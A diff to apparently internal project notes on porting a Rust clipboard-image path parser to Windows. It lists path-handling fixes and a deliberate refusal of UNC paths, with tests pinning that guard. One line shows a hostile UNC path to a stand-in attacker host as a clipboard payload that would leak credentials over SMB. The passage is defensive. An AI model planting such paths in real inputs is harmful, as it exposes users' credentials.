@@ -105,23 +105,42 @@ fails loudly rather than at the Task 10 milestone.
    keep the diff against upstream small.
 
 4. **`engine/crates/pixel-core/src/clipboard_image.rs` — POSIX path assumptions
-   widened** (Task 4). This is the first edit to one of the 43 supposedly-portable
-   files, and it was found by running their tests rather than by reading them: the
-   file uses no unix *API*, which is what `inventory.test.mjs` screens for, but it
-   assumed unix *paths* in three places, and three of its five tests failed on
-   Windows.
+   widened, and UNC deliberately narrowed** (Task 4, plus a later review round). This
+   is the first edit to one of the 43 supposedly-portable files, and it was found by
+   running their tests rather than by reading them: the file uses no unix *API*, which
+   is what `inventory.test.mjs` screens for, but it assumed unix *paths* in four
+   places, and three of its five tests failed on Windows.
 
-   - `image_path_from_paste` gated on a leading `/` or `~`, so every Windows path
-     (`C:\…`, `\\host\share\…`) was rejected as prose. Now `looks_absolute`.
+   - `image_path_from_paste` gated on a leading `/` or `~`, so every drive-qualified
+     Windows path (`C:\…`, `C:/…`) was rejected as prose. Now `looks_absolute`.
+   - a `file://` URL kept the empty authority's slash — `file:///C:/pics/a.png` became
+     `/C:/pics/a.png`, which reads as absolute and then fails `is_file` silently, on
+     the one spelling every real producer writes. Now `file_url_path`, which unwraps
+     the empty-authority form and leaves a named authority alone.
    - `~/` expanded through `HOME`, which Windows spells `USERPROFILE`. Now `home_dir`.
    - `unescape` treated every backslash as a quote character, turning
      `C:\Users\me\a.png` into `C:Usersmea.png`. On Windows it now unescapes only an
      escaped space or tab — the case the function exists for — and leaves every other
      backslash standing as a separator.
 
-   All three are `cfg!(windows)` branches, so unix behaviour is byte-for-byte what it
-   was. Upstream would probably take this patch; it is a portability fix, not a
+   All four are `cfg!(windows)` branches, so unix behaviour is byte-for-byte what it
+   was. Upstream would probably take that much; it is a portability fix, not a
    divergence in intent.
+
+   ⚠️ **The fifth change is a divergence in intent, and it goes the other way.**
+   `looks_absolute` now **refuses** UNC — `\\host\share\a.png`, `//host/share/…`,
+   `\\?\UNC\…` and `file://host/share/…` are all declined before `is_file` is asked.
+   On Windows that probe is not a filesystem question: it is an outbound SMB or WebDAV
+   connection with implicit authentication, made synchronously on the thread that runs
+   `handle_event`. A page that puts `\\attacker.example\s\a.png` on the clipboard would
+   get a credential handshake out of this machine on the next Ctrl+V, and a host that
+   does not route would freeze the UI for the whole connect timeout. The extended-length
+   spelling of a *local* path (`\\?\C:\pics\a.png`) is still admitted, because there is
+   no host in it. Pinned by `a_unc_share_is_never_probed` and
+   `an_extended_length_local_path_is_still_local`, both of which assert on the gate
+   rather than on the result — `is_file` on an unreachable share is `false` too, so an
+   outcome check would pass with the guard removed. Upstream would not take this one
+   unchanged: it costs a paste that used to work on a trusted share.
 
    ⚠️ **The lesson generalises: "no unix API" is not "portable".** Two other files
    handle paths (`image_cache.rs`, `native.rs`) and their tests pass today, but the
